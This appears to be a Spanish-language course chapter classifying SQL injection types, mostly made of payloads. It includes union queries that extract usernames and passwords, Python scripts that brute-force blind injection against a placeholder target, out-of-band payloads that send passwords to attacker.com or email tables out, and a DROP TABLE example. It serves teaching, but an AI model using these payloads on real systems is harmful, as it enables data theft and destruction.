# 7.2 Tipos de Inyección SQL

## Clasificación General

```
SQL Injection
├── 1. In-Band (In-band)
│   ├── Error-based
│   └── Union-based
├── 2. Blind (Ciego)
│   ├── Boolean-based
│   └── Time-based
├── 3. Out-of-Band (Fuera de banda)
└── 4. Second-Order (Segundo orden)
```

## 1. In-Band SQL Injection

El atacante usa el mismo canal para lanzar el ataque y recibir los resultados.

### 1.1 Error-Based
Aprovecha mensajes de error de la base de datos para obtener información.

```sql
-- Provocar error para obtener información
' AND 1=CONVERT(INT, (SELECT @@version)) --
' AND 1=CONVERT(INT, (SELECT table_name FROM information_schema.tables)) --
```

**Payloads comunes:**
```sql
' OR 1=1 --
' AND 1=0 --
' HAVING 1=1 --
' GROUP BY 1,2,3,4,5,6 --
```

**Extrayendo información con errores (MySQL):**
```sql
-- Obtener nombre de base de datos
' AND extractvalue(1, concat(0x7e, database())) --

-- Obtener usuario
' AND extractvalue(1, concat(0x7e, user())) --

-- Obtener versión
' AND extractvalue(1, concat(0x7e, @@version)) --

-- Obtener tablas
' AND extractvalue(1, concat(0x7e, (SELECT table_name FROM information_schema.tables LIMIT 0,1))) --
```

### 1.2 Union-Based
Usa UNION SELECT para combinar resultados de la consulta original con datos maliciosos.

```sql
-- Paso 1: Determinar número de columnas
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
-- ... hasta obtener error

-- Paso 2: Verificar columnas de texto
' UNION SELECT 'a','b','c' --

-- Paso 3: Obtener información de la base de datos
' UNION SELECT database(), user(), version() --

-- Paso 4: Obtener tablas
' UNION SELECT table_name, table_type, NULL FROM information_schema.tables --

-- Paso 5: Obtener columnas de una tabla
' UNION SELECT column_name, data_type, NULL FROM information_schema.columns WHERE table_name='usuarios' --

-- Paso 6: Extraer datos
' UNION SELECT usuario, password, NULL FROM usuarios --
```

**Ejemplo completo en sistema de ventas:**
```sql
-- URL vulnerable: /productos.php?id=1
-- Consulta original: SELECT nombre, precio, stock FROM productos WHERE id = 1

-- Payload para extraer clientes:
1 UNION SELECT nombre, email, telefono FROM clientes

-- Payload para extraer todas las tablas:
1 UNION SELECT table_name, table_schema, NULL FROM information_schema.tables

-- Payload para datos de login:
1 UNION SELECT usuario, password, NULL FROM usuarios WHERE id = 1
```

## 2. Blind SQL Injection

El atacante no ve los resultados directamente; deduce información mediante preguntas de sí/no o retardos.

### 2.1 Boolean-Based
Pregunta verdadero/falso y observa diferencias en la respuesta.

```sql
-- Prueba de inyección (debe funcionar)
' AND 1=1 --  → página normal
' AND 1=2 --  → página diferente (o error)

-- Determinar nombre de base de datos carácter por carácter
' AND SUBSTRING(database(), 1, 1) = 's' --  → TRUE
' AND SUBSTRING(database(), 1, 1) = 'x' --  → FALSE
' AND SUBSTRING(database(), 2, 1) = 'i' --  → TRUE
-- Así hasta completar: "sistema_ventas"

-- Determinar longitud
' AND LENGTH(database()) = 13 --  → TRUE

-- Extraer nombre de tablas
' AND SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 0,1), 1, 1) = 'f' --

-- Extraer datos de usuarios
' AND SUBSTRING((SELECT password FROM usuarios LIMIT 0,1), 1, 1) = 'a' --
```

**Script de automatización (Python):**
```python
import requests

url = "http://target.com/productos.php"
caracteres = "abcdefghijklmnopqrstuvwxyz0123456789_"
db_name = ""

for pos in range(1, 20):
    for c in caracteres:
        payload = f"' AND SUBSTRING(database(), {pos}, 1) = '{c}' -- "
        params = {"id": payload}
        r = requests.get(url, params=params)
        
        if "Producto encontrado" in r.text:  # TRUE
            db_name += c
            print(f"Database: {db_name}")
            break
    else:
        break  # No más caracteres

print(f"Database name: {db_name}")
```

### 2.2 Time-Based
Usa retardos (SLEEP, WAITFOR) para inferir información.

```sql
-- Prueba de inyección
' OR IF(1=1, SLEEP(5), 0) --   → 5 segundos de retardo
' OR IF(1=2, SLEEP(5), 0) --   → respuesta inmediata

-- Extraer datos letra por letra con retardos
' OR IF(SUBSTRING(database(),1,1)='s', SLEEP(3), 0) --
' OR IF(SUBSTRING(database(),2,1)='i', SLEEP(3), 0) --

-- Encontrar tablas
' OR IF(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 0,1),1,1)='f', SLEEP(3), 0) --

-- MySQL version
' OR IF(@@version LIKE '8%', SLEEP(3), 0) --

-- SQL Server
'; IF (SELECT COUNT(*) FROM usuarios) > 0 WAITFOR DELAY '0:0:5' --

-- PostgreSQL
' OR (SELECT CASE WHEN (SELECT COUNT(*) FROM usuarios) > 0 THEN pg_sleep(5) ELSE pg_sleep(0) END) --
```

**Script de Time-Based (Python):**
```python
import requests
import time

url = "http://target.com/productos.php"
caracteres = "abcdefghijklmnopqrstuvwxyz0123456789_"
db_name = ""

for pos in range(1, 20):
    for c in caracteres:
        payload = f"' OR IF(SUBSTRING(database(),{pos},1)='{c}', SLEEP(2), 0) -- "
        params = {"id": payload}
        
        start = time.time()
        r = requests.get(url, params=params)
        elapsed = time.time() - start
        
        if elapsed > 1.5:  # Hubo retardo → TRUE
            db_name += c
            print(f"Database: {db_name}")
            break
    else:
        break
```

## 3. Out-of-Band SQL Injection

Usa un canal diferente para recibir los datos (DNS, HTTP request).

```sql
-- MySQL: Enviar datos vía DNS
' LOAD_FILE(CONCAT('\\\\', (SELECT @@version), '.attacker.com\\a')) --

-- Oracle: Enviar vía HTTP request
' UTL_HTTP.request('http://attacker.com/' || (SELECT password FROM usuarios WHERE id=1)) --

-- SQL Server: Enviar vía DNS
'; EXEC master..xp_dirtree '\\' + (SELECT @@version) + '.attacker.com\folder' --

-- SQL Server: Enviar vía email (si está configurado)
'; EXEC msdb.dbo.sp_send_dbmail @recipients='attacker@email.com', @query='SELECT * FROM usuarios' --
```

**Receptor (atacante):**
```bash
# Escuchar peticiones DNS
tcpdump -i eth0 port 53

# Servidor HTTP para capturar requests
nc -lvp 80
```

## 4. Second-Order SQL Injection

Los datos maliciosos se almacenan primero y se ejecutan después.

```sql
-- Paso 1: Atacante se registra con nombre malicioso
INSERT INTO usuarios (nombre, password) 
VALUES ('admin' OR '1'='1' -- ', 'pass123');
-- El nombre se almacena en la BD

-- Paso 2: Días después, un administrador ve el perfil del usuario
-- La consulta usa el nombre almacenado
$sql = "SELECT * FROM usuarios WHERE nombre = '" . $nombre . "'";
-- Se ejecuta: SELECT * FROM usuarios WHERE nombre = 'admin' OR '1'='1' -- '
-- ¡Devuelve todos los usuarios!
```

**Ejemplo en sistema de ventas:**
```sql
-- Atacante crea cliente con nombre malicioso
INSERT INTO clientes (nombre, email, direccion) VALUES
('Juan; DROP TABLE facturas;--', 'juan@hack.com', '');

-- Mes después, al generar un reporte:
SELECT * FROM facturas WHERE cliente = 'Juan; DROP TABLE facturas;--';
-- ¡La tabla facturas se elimina!
```

## Comparativa de Tipos

| Tipo | Velocidad | Dificultad | Información | Ruido | Requisitos |
|------|-----------|------------|-------------|-------|------------|
| Error-Based | Rápida | Baja | Alta | Mucho | Errores visibles |
| Union-Based | Rápida | Baja | Muy alta | Poco | Mismo número de columnas |
| Boolean-Based | Lenta | Media | Completa | Poco | Respuesta diferenciable |
| Time-Based | Muy lenta | Alta | Completa | Nulo | Sin ruido de red |
| Out-of-Band | Lenta | Alta | Completa | Poco | Capacidad de red externa |
| Second-Order | Días | Alta | Variable | Nulo | Registro de datos |

## Detección de Tipo

```sql
-- Prueba 1: Error-based (si muestra errores)
' --
' --

-- Prueba 2: Boolean-based
' AND 1=1 --  (TRUE)
' AND 1=2 --  (FALSE)

-- Prueba 3: Time-based  
' OR SLEEP(5) --
' OR pg_sleep(5) --
'; WAITFOR DELAY '0:0:5' --

-- Prueba 4: Union
' ORDER BY 1 --
' UNION SELECT NULL --
```

---

## Anterior: [01 Que Es Sql Injection](../07-sql-injection/01-que-es-sql-injection.md)
## Siguiente: [03 Deteccion Y Exploit](../07-sql-injection/03-deteccion-y-exploit.md)

[Volver al índice](../README.md)
